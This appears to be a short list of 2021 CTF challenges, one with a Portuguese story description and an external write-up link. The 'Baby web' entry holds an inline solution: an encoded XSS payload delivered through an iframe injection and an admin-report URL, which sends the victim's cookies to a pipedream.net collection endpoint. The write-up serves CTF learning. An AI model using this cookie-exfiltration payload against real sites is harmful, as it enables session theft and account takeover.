## Fresca Soda (csctf-2021)

**Description (portuguese):** Os cientistas da Igreja do Coletivo andam desconfiando que a Vought International mandou seus herois para descobrirem a formula secreta do seu sucesso internacional Fresca Soda.

Como retaliação, a Igreja pediu a voce que validasse a possibilidade de alguma atividade super estranha no sistema, e deixou claro: A cada dois segundos um de nossos administradores acessa o segredo da formula para garantir que ele esteja seguro.

**Solves:** 2

**First Blood:** -

**Write-up (english):** https://0xten.gitbook.io/public/clearsale-ctf/2021/fresca-soda

## Baby web (lw-2021)

**Description:** pwn me

**Solves:** 2

**First Blood:** -

**Write-up:** 

```
// mydomain/POC.HTML
name='<svg/onload="top.document.location=`https://my.pipedream.net/?c=${top.document.cookie}`;">';
location = "http://challenge_addr/?name=%0074iframe+src=JAVASCRIPT:%26%23x70%3B%26%23x61%3B%26%23x72%3B%26%23x65%3B%26%23x6E%3B%26%23x74%3B%26%23x2E%3B%26%23x6E%3B%26%23x61%3B%26%23x6D%3B%26%23x65%3B%3B%0076%0074/iframe%0076";

// challenge report to admin page:
http://challenge_addr/?report=%3Fname%3D%250074iframe%2Bsrc%3D%2F%2Fmydomain/POC.HTML%250076%250074%2Fiframe%250076
```

